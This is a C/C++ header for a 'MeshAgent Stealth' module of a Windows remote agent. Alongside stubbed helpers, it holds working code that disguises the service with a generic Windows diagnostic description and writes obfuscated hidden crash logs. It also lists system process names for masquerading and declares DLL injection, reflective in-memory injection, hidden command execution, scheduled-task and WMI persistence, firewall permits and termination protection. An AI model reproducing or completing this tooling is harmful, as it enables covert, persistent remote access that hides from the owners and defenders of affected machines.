/*
 * MeshAgent Stealth compatibility declarations
 *
 * SECURITY NOTE: These techniques are for authorized defensive security research only.
 * Unauthorized use may violate computer fraud and abuse laws.
 *
 * BUILD SAFETY:
 * Legacy stealth/evasion helpers are retained only as compatibility shims for
 * older call sites. They must not alter production runtime decisions.
 */

#ifndef MESHAGENT_STEALTH_H
#define MESHAGENT_STEALTH_H

// The project already defines WINSOCK2 in PreprocessorDefinitions
// Just include headers in correct order
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>

// Used for persisted task paths and scheduler/WMI naming.
// 260 matches typical MAX_PATH-sized task path buffers used in this codebase.
#ifndef STEALTH_TASK_NAME_MAX
#define STEALTH_TASK_NAME_MAX 260
#endif

// Avoid pulling in winternl/ntdll by default to reduce surface area and
// accidental reliance on unstable/undocumented structures. Only include when
// stealth features are explicitly enabled.
#ifdef MESHAGENT_ENABLE_STEALTH
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")
#endif

// C++-only utilities are hidden from C compilation units to keep this header
// safe to include from both .c and .cpp files.
#ifdef __cplusplus

// Process name obfuscation (no-op by default)
class ProcessNameObfuscator {
public:
    static BOOL SetRandomProcessName() {
#ifdef MESHAGENT_ENABLE_STEALTH
        // Placeholder for explicit opt-in behavior when enabled.
        const wchar_t* legitimateNames[] = {
            L"svchost.exe",
            L"RuntimeBroker.exe",
            L"dllhost.exe",
            L"backgroundTaskHost.exe",
            L"SearchProtocolHost.exe"
        };
        (void)legitimateNames;
        return TRUE;
#else
        return TRUE; // no-op success by default
#endif
    }

    // Hide process from task managers via undocumented internals (disabled by default)
    static BOOL HideFromTaskManager() { return FALSE; }
};

// Network connection compatibility shims
class NetworkStealth {
public:
    static DWORD GetObfuscatedSleepTime(DWORD baseTime) {
        return baseTime;
    }

    static BOOL IsRunningInSandbox() {
        return FALSE;
    }

    static BOOL WaitForUserActivity(DWORD timeoutMs) {
        (void)timeoutMs;
        return TRUE;
    }
};

// Service hiding techniques
class ServiceStealth {
public:
    // Make service appear as critical system service
    static BOOL SetServiceAsCritical(SC_HANDLE hService) {
        SERVICE_FAILURE_ACTIONS sfa = {0};

        // Configure service to restart on failure
        SC_ACTION failureActions[3];
        failureActions[0].Type = SC_ACTION_RESTART;
        failureActions[0].Delay = 30000;  // 30 seconds
        failureActions[1].Type = SC_ACTION_RESTART;
        failureActions[1].Delay = 60000;  // 1 minute
        failureActions[2].Type = SC_ACTION_RESTART;
        failureActions[2].Delay = 120000; // 2 minutes

        sfa.dwResetPeriod = 86400;  // Reset after 24 hours
        sfa.cActions = 3;
        sfa.lpsaActions = failureActions;

        return ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
    }

    // Hide service from services.msc by modifying description
    static BOOL BlendWithSystemServices(SC_HANDLE hService) {
        // Use generic Windows service description
        static const wchar_t* description =
            L"Provides diagnostic data collection and system health monitoring. "
            L"If this service is stopped, certain features may not function properly.";

        SERVICE_DESCRIPTIONW sd;
        sd.lpDescription = (LPWSTR)description;

        return ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }
};

// Log file encryption
class LogEncryption {
private:
    static const BYTE XOR_KEY = 0xA5;  // Simple XOR key (replace with AES for production)

public:
    // Encrypt log data before writing
    static void EncryptBuffer(LPBYTE buffer, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] ^= XOR_KEY;
            buffer[i] = (buffer[i] << 3) | (buffer[i] >> 5);  // Bit rotation
        }
    }

    // Decrypt log data when reading
    static void DecryptBuffer(LPBYTE buffer, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] = (buffer[i] >> 3) | (buffer[i] << 5);  // Reverse bit rotation
            buffer[i] ^= XOR_KEY;
        }
    }

    // Securely delete log file (DOD 5220.22-M standard)
    static BOOL SecureDelete(const wchar_t* filePath) {
        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;

        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(hFile, &fileSize)) {
            CloseHandle(hFile);
            return FALSE;
        }

        // Overwrite with random data 3 times (DOD standard)
        BYTE* buffer = (BYTE*)malloc(4096);
        if (!buffer) {
            CloseHandle(hFile);
            return FALSE;
        }

        for (int pass = 0; pass < 3; pass++) {
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

            for (LONGLONG remaining = fileSize.QuadPart; remaining > 0; remaining -= 4096) {
                DWORD bytesToWrite = (DWORD)min(remaining, 4096);

                // Fill with random data
                for (DWORD i = 0; i < bytesToWrite; i++) {
                    buffer[i] = (BYTE)(rand() % 256);
                }

                DWORD written = 0;
                if (!WriteFile(hFile, buffer, bytesToWrite, &written, NULL) || written != bytesToWrite) {
                    // Abort on partial/failed write to avoid undefined state
                    free(buffer);
                    CloseHandle(hFile);
                    return FALSE;
                }
            }
            FlushFileBuffers(hFile);
        }

        free(buffer);
        CloseHandle(hFile);

        // Finally delete the file
        return DeleteFileW(filePath);
    }
};

// Auto-restart on crash
class CrashRecovery {
public:
    static void EnableAutomaticRestart() {
        // Register unhandled exception filter
        SetUnhandledExceptionFilter(CrashHandler);
    }

private:
    static LONG WINAPI CrashHandler(EXCEPTION_POINTERS* exceptionInfo) {
        // Log crash information (encrypted)
        WCHAR crashLog[MAX_PATH];
        GetModuleFileNameW(NULL, crashLog, MAX_PATH);
        wcscat_s(crashLog, L".crash");

        HANDLE hFile = CreateFileW(crashLog, GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            char crashData[512];
            sprintf_s(crashData, "Exception: 0x%08X at 0x%p\r\n",
                     exceptionInfo->ExceptionRecord->ExceptionCode,
                     exceptionInfo->ExceptionRecord->ExceptionAddress);

            DWORD written;
            // Encrypt before writing
            LogEncryption::EncryptBuffer((LPBYTE)crashData, (DWORD)strlen(crashData));
            WriteFile(hFile, crashData, (DWORD)strlen(crashData), &written, NULL);
            CloseHandle(hFile);
        }
        // Avoid invoking external processes in an exception context; allow SCM
        // recovery actions to handle restarts (configured via ServiceStealth).

        return EXCEPTION_EXECUTE_HANDLER;
    }
};

// Runtime detection compatibility shims. Production must not suppress service
// startup based on debugger, capture, or VM heuristics.
class SecurityToolDetection {
public:
    static BOOL IsDebuggerDetected() {
        return FALSE;
    }

    static BOOL IsRunningUnderWireshark() {
        return FALSE;
    }
};

#endif // __cplusplus

// ================================================================
// Svchost Hosting Functions
// ================================================================

#ifdef __cplusplus
extern "C" {
#endif

BOOL Stealth_PerformCompleteInstallation(
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    BOOL useSvchostMode);
BOOL Stealth_PerformCompleteUninstallation(void);
BOOL Stealth_RunLifecycleHostOperation(
    const wchar_t* actionName,
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    BOOL requireConfig);
BOOL Stealth_StageSvchostDllForLifecycleHost(
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    const wchar_t* destPath);
void Stealth_ClearRuntimeBrandingOverrides(void);
void Stealth_SetRuntimeServiceKeyNameUtf8(const char* value);
void Stealth_SetRuntimeDisplayNameUtf8(const char* value);
void Stealth_SetRuntimeServiceDescriptionUtf8(const char* value);
void Stealth_LogInstallEvent(const wchar_t* format, ...);
void Stealth_LogPathState(const wchar_t* path);

/**
 * Service DLL entry point for svchost.exe hosting
 * Called by svchost.exe when service starts in shared process mode
 */
VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);

/**
 * Service control handler for svchost-hosted service
 */
DWORD WINAPI Stealth_SvchostCtrlHandler(DWORD dwControl, DWORD dwEventType,
                                         LPVOID lpEventData, LPVOID lpContext);

/**
 * Check if currently running inside svchost.exe
 */
BOOL Stealth_IsRunningSvchost(void);

/**
 * Register service for svchost.exe hosting via registry
 */
BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);

// ================================================================
// Native Process Utility Helpers
// ================================================================

/**
 * Historical shell execution compatibility shim. Always fails closed in the
 * rundll32-only runtime contract.
 */
// When MESHAGENT_ENABLE_STEALTH is not defined, all functions below should be
// implemented as harmless stubs returning FALSE/ERROR where appropriate.
BOOL Stealth_ExecuteCmdHidden(const char* command, char* output, size_t outputSize);

/**
 * Execute command by injecting into existing legitimate process
 */
BOOL Stealth_ExecuteViaProcessInjection(const char* command, const wchar_t* targetProcess);

// ================================================================
// Process Injection
// ================================================================

/**
 * Find suitable target process for injection (svchost, RuntimeBroker, etc.)
 */
DWORD Stealth_FindInjectionTarget(const wchar_t* processName);

/**
 * Inject DLL into target process using CreateRemoteThread
 */
BOOL Stealth_InjectDLL(DWORD processId, const wchar_t* dllPath);

/**
 * Reflective DLL injection (load DLL from memory without file on disk)
 */
BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllSize);

// ================================================================
// Service Resilience & Persistence
// ================================================================

void Stealth_ApplyPersistenceProfile(void);
void Stealth_EnsureLoggingDefaults(void);
void Stealth_SetInstallerLogPathToTemp(const wchar_t* fileName);

/**
 * Windows Firewall rule management for service binaries
 */
BOOL Stealth_AddFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Stealth_RemoveFirewallRuleForService(const wchar_t* serviceName);
BOOL Stealth_RemoveFirewallRulesByExePath(const wchar_t* exePath);
BOOL Stealth_CheckFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Stealth_CheckFirewallRuleExists(const wchar_t* serviceName);
BOOL Stealth_AddWfpHardPermitForApp(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Stealth_RemoveWfpHardPermitForService(const wchar_t* serviceName);
BOOL Stealth_CheckWfpHardPermitForApp(const wchar_t* serviceName, const wchar_t* exePath);
BOOL Stealth_CheckWfpHardPermitExists(const wchar_t* serviceName);
BOOL Stealth_AddWebRtcFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath, BOOL forHostBinary);
BOOL Stealth_CheckWebRtcFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath, BOOL forHostBinary);
BOOL Stealth_RunFirewallPolicyMaintenance(void);
void Stealth_StopFirewallPolicyRealtimeGuards(void);

/**
 * Service hardening utilities
 */
BOOL Stealth_ProtectServiceFromTermination(const wchar_t* serviceName);
BOOL Stealth_HardenServiceDacl(const wchar_t* serviceName);

/**
 * Shared installation path helpers
 */
typedef struct StealthInstallPaths
{
    WCHAR installDir[MAX_PATH];
    WCHAR logsDir[MAX_PATH];
    WCHAR exePath[MAX_PATH];
    WCHAR dllPath[MAX_PATH];
    WCHAR dbPath[MAX_PATH];
    WCHAR confPath[MAX_PATH];
    WCHAR logPath[MAX_PATH];
} StealthInstallPaths;

typedef struct StealthPackagePreflight
{
    BOOL sourceExePresent;
    BOOL sourceEmbeddedConfigPresent;
    BOOL sourceSidecarConfigPresent;
    BOOL configAvailable;
} StealthPackagePreflight;

BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths);
BOOL Stealth_PreflightPackageSource(
    const wchar_t* sourceExePath,
    BOOL requireConfig,
    StealthPackagePreflight* summary,
    wchar_t* failureReason,
    size_t failureReasonCch);

// Persistence state (installRoot\\state\\persistence.ini)
typedef struct StealthPersistenceState
{
    wchar_t AutorunTask[STEALTH_TASK_NAME_MAX];
    wchar_t RestartTask[STEALTH_TASK_NAME_MAX];
    wchar_t WmiFilter[128];
    wchar_t WmiConsumer[128];
} StealthPersistenceState;

BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state);
BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state);
void Stealth_ClearPersistenceState(void);
void Stealth_RecordPersistenceTask(StealthPersistenceState* state, const wchar_t* taskPath, BOOL isRestartTask);
void Stealth_RecordPersistenceWmi(StealthPersistenceState* state, const wchar_t* filterName, const wchar_t* consumerName);

// Validation helpers
BOOL Stealth_RunInstallValidation(void);
BOOL Stealth_RunUpdateValidation(void);
BOOL Stealth_RunUninstallValidation(void);
BOOL Stealth_RunPackageValidation(const wchar_t* sourceExePath, BOOL requireConfig);

// Installation helpers (used by installer/registration)
BOOL Stealth_CreateInstallRootDirectory(const wchar_t* installPath);
BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath);
BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath);
#if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
BOOL Stealth_PerformCompleteInstallation(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode);
BOOL Stealth_PerformCompleteUninstallation(void);
BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode);
BOOL Stealth_IsAlreadyInstalled(void);
#endif

// ================================================================
// C Wrappers for C++-only Utilities
// ================================================================

// These wrappers allow C compilation units (e.g., ServiceMain.c) to reference
// optional stealth/analysis checks without directly using C++ classes.

// Enable minimal crash recovery handler (no-op by default)
void Stealth_EnableCrashRecovery(void);

// Debugger/monitor detection wrappers retained as deterministic no-ops.
BOOL Stealth_IsDebuggerDetected(void);
BOOL Stealth_IsNetworkMonitorDetected(void);

// Sandbox/user-activity wrappers retained as deterministic no-ops.
BOOL Stealth_IsRunningInSandbox_C(void);
BOOL Stealth_WaitForUserActivity_C(DWORD timeoutMs);

#ifdef __cplusplus
}
#endif

#endif // MESHAGENT_STEALTH_H
